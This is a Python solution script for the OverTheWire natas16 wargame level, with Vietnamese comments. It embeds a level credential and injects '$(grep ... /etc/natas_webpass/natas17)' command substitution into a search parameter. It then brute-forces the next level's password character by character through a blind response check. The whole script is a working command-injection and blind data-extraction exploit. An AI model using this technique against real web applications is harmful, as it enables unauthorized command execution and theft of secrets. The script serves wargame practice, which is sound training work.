import urllib.request
import urllib.parse
import base64
import string
import time

url = "http://natas16.natas.labs.overthewire.org/"
credentials = base64.b64encode(b"natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb").decode("ascii")

def check_match(pattern):
    # Payload ghép lệnh con $(grep ...) với từ "doomed"
    query = f"$(grep {pattern} /etc/natas_webpass/natas17)doomed"
    params = urllib.parse.urlencode({"needle": query})
    req = urllib.request.Request(f"{url}?{params}")
    req.add_header("Authorization", f"Basic {credentials}")
    
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                content = resp.read().decode("utf-8")
                # Nếu từ "doomed" BIẾN MẤT khỏi kết quả -> Khớp thành công (TRUE)!
                return "doomed" not in content
        except Exception:
            time.sleep(1)
    return False

# BƯỚC 1: Lọc tập ký tự có trong mật khẩu
all_chars = string.ascii_letters + string.digits
filtered = ""
print("[*] Đang lọc các ký tự có trong mật khẩu của natas17...")

for c in all_chars:
    if check_match(c):
        filtered += c
        print(f" -> Ký tự hợp lệ: {c}")

print(f"\n[+] Tập ký tự rút gọn ({len(filtered)} ký tự): {filtered}")

# BƯỚC 2: Dò tuần tự từng vị trí từ trái sang phải (32 ký tự)
password = ""
print("\n[*] Đang dò tìm từng vị trí mật khẩu...")

for i in range(1, 33):
    found = False
    for c in filtered:
        candidate = password + c
        # Dùng ký tự ^ để neo vào đầu chuỗi mật khẩu
        if check_match(f"^{candidate}"):
            password = candidate
            print(f"Vị trí {i:02d}: {c} -> Mật khẩu hiện tại: {password}")
            found = True
            break
    if not found:
        print(f"[-] Không tìm thấy ký tự tại vị trí {i}!")
        break

print(f"\n[+] Mật khẩu hoàn chỉnh của natas17 là: {password}")
